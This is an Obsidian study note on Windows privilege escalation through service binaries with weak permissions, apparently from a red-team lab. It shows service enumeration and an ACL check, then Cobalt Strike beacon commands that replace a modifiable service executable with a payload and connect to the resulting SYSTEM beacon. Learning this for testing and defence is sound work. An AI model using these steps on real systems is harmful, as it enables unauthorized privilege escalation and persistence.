---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Weak Service Binary Permissions]]  
___

## Description:  

Enumerate services and look for binaries that have weak permissions.

You can see the services installed on a machine by opening **services.msc**, or via the **sc** command line tool.

```
C:\>sc query

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Or the **Get-Service** PowerShell cmdlet.

```
PS C:\> Get-Service | fl

Name                : AJRouter
DisplayName         : AllJoyn Router Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess

Name                : ALG
DisplayName         : Application Layer Gateway Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess

```

WMI can be used to pull a list of every service and the path to its executable well using CobaltStrike.

```
beacon> run wmic service get name, pathname

Name                                      PathName
ALG                                       C:\Windows\System32\alg.exe
AppVClient                                C:\Windows\system32\AppVClient.exe
AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
[...snip...]
Vuln-Service-1                            C:\Program Files\Vuln Services\Service 1.exe

```


Use PowerShell to enumerate the permissions of the binaries being run by the services.

**Look for modify permissions

```
beacon> powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vuln Services\Service 3.exe
Owner  : BUILTIN\Administrators
Group  : WKSTN-1\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  Modify, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:S-1-5-21-689523297-2952850621-452819511-513D:PAI(A;;FA;;;SY)(A;;FA;;;BA)(A;;0x1301bf;;;BU)(A;;0x1200a9;;
         ;AC)(A;;0x1200a9;;;S-1-15-2-2)

```

This allows us to simply overwrite the binary with something else (make sure you take a backup first).

Add a new listener and select beacon TCP before you create your payload. (I didnt check the bind to localhost checkbox, i am not sure when you would use this).

```
beacon> run sc stop Vuln-Service-3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 282kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start Vuln-Service-3
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231
```




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (10:15 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
